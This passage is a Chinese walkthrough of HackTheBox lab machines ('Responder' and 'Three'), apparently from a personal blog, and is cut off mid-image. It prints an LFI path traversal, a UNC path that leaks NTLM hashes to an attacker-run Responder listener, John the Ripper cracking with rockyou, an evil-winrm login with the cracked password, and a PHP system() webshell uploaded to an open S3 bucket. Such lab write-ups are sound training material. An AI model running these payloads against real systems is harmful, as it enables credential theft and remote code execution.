服务时被重定向到的域，直接访问下 ip</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Fba81xcoMoRvVEH2.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：unika.htb</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/i9u4cZhKi1cgx5JA.png!thumbnail\" alt=\"\"></p>\n<p>由于重定向到域的问题，网页不能正常访问，因此修改一下 /etc/hosts 文件，添加</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IP unika.htb</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EnwYUgOgg6JB4OS4.png!thumbnail\" alt=\"\"></p>\n<p>接着访问</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/qS9nLHNnAIrLBrOX.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：php</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZJIGvXS3Rw0mf0Gr.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：page</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MiVCYBzgDOPQbnaH.png!thumbnail\" alt=\"\"></p>\n<p>提示已经很明显了，用来本地文件包含</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：../../../../../../../../windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LbA89HwqWb5leTy9.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：//10.10.14.6/somefile</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/GwT5nBdq3YlhLese.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：New Technology Lan Manager</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4QiYfLLECxc2GoB8.png!thumbnail\" alt=\"\"></p>\n<p>responder 使用的参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：-I</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Kx8ffinxnY7iIV4V.png!thumbnail\" alt=\"\"></p>\n<p>john 爆破的全称</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：John The Ripper</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OCRdtQxLj02yxzT9.png!thumbnail\" alt=\"\"></p>\n<p>这里就要用到前几问的知识点了</p>\n<p>先用 ifconfig 获取 tun0 也就是 vpn 地址</p>\n<p>再用 responder -I 监听</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/H3YZxH4SJ29okAOL.png!thumbnail\" alt=\"\"></p>\n<p>接着在浏览器进行本地文件包含</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://unika.htb/index.php?page=//IP/somefile</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fZNfz5CT7QQpRazu.png!thumbnail\" alt=\"\"></p>\n<p>url 中的 IP 为 tun0 中的 ip 地址即 vpn 地址，responder 抓到了 administrator 的密码 hash</p>\n<p>保存在 hash.txt 后使用 john 进行爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">john hash.txt -w=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>\n<p>rockyou.txt 是 kali 自带的密码字典，解压就可以用了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/st55zKXpJXkAxAYr.png!thumbnail\" alt=\"\"></p>\n<p>得到 administrator 的密码 badminton</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：badminton</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9AVxnIdRairG0JcO.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：5985</span><br></pre></td></tr></table></figure>\n<p>上网查找了下资料，发现 5985 端口可以利用 winrm 这个远程管理工具进行登录<br>\n使用 evil-winrm 远程管理工具进行连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install evil-winrm</span><br><span class=\"line\">evil-winrm -i 靶机IP -u Administrator -p badminton</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/sGO11yJBLQrdM6DZ.png!thumbnail\" alt=\"\"></p>\n<p>连接上之后会发现当前目录是个空目录，于是就回到根目录一级一级进行查找</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd C:/</span><br><span class=\"line\">ls</span><br><span class=\"line\">cd Users</span><br><span class=\"line\">ls</span><br><span class=\"line\">cd mike</span><br><span class=\"line\">ls</span><br><span class=\"line\">cd Desktop</span><br><span class=\"line\">ls</span><br><span class=\"line\">cat flag.txt</span><br></pre></td></tr></table></figure>\n<p>虽然是 windows 的机子，但是 ls 和 cd 还是可以使用（当然 dir 也可以）<br>\n经过一级级的寻找最终发现 flag 在 mike 用户的桌面上</p>\n<h1 id=\"three\"><a class=\"markdownIt-Anchor\" href=\"#three\">#</a> Three</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/epfQL88LlaylOzRR.png!thumbnail\" alt=\"\"></p>\n<p>nmap 扫描</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/msjF1sYzTCbrpvRQ.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：2</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YpNkSmFSUXehgYZm.png!thumbnail\" alt=\"\"></p>\n<p>询问提供电子邮件的域名，访问 ip</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IN61JZBL1nBxK2N9.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：thetoppers.htb</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/iHLYfkPZkl8vVokW.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：/etc/hosts</span><br></pre></td></tr></table></figure>\n<p>之前几个靶机都有过的操作，修改 /etc/hosts 文件，添加</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">靶机IP thetoppers.htb</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hIq9BQlCfCrPfmSj.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：s3.thetoppers.htb</span><br></pre></td></tr></table></figure>\n<p>爆破子域名就行，但是这里不知道是什么原因，可能是 vpn 的问题，爆破不出，根据开启靶机处的提示得到答案<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/dYer6luimy6mZtP8.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/qPRBwIpfX19EoNDL.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：Amazon S3</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OfAosqGa7SpaFlQ5.png!thumbnail\" alt=\"\"></p>\n<p>该服务可以使用 awscii 命令来进行交互</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/FqZIKN2NGFkPNQRy.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：aws configure</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gX8RNomYnRFV9DT7.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：aws s3 ls</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/A5NlJy6AU9Vuayfy.png!thumbnail\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">答案：PHP</span><br></pre></td></tr></table></figure>\n<p>将 s3.thetoppers.htb 同样修改到 /etc/hosts 中<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Od75fknYo48NhEpc.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>访问<span class=\"exturl\" data-url=\"aHR0cDovL3MzLnRoZXRvcHBlcnMuaHRiLw==\"> http://s3.thetoppers.htb/</span></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/J0fi4SvyxEN9lZR6.png!thumbnail\" alt=\"\"></p>\n<p>出现这个界面的时候就可以了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aws configure</span><br><span class=\"line\">aws --endpoint=http://s3.thetoppers.htb s3 ls</span><br><span class=\"line\">aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</span><br><span class=\"line\">echo &#x27;&lt;?php system($_GET[&quot;nnnpc&quot;]); ?&gt;&#x27; &gt; shell.php</span><br><span class=\"line\">aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb</span><br></pre></td></tr></table></figure>\n<p>按照之前的问题所述进行配置 awscli<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NdZGmgIUk1r1SKAk.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>列出所有 s3 的桶</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3IZMXMs8dpa8geGX.png!thumbnail\" alt=\"\"></p>\n<p>列出 s3 下的目录及对象</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mV3jl01c9F9LtkVx.png!thumbnail\" alt=\"\"></p>\n<p>编写命令执行的 php 代码</p>\n<p><img data-src=\"data:image/png;base64,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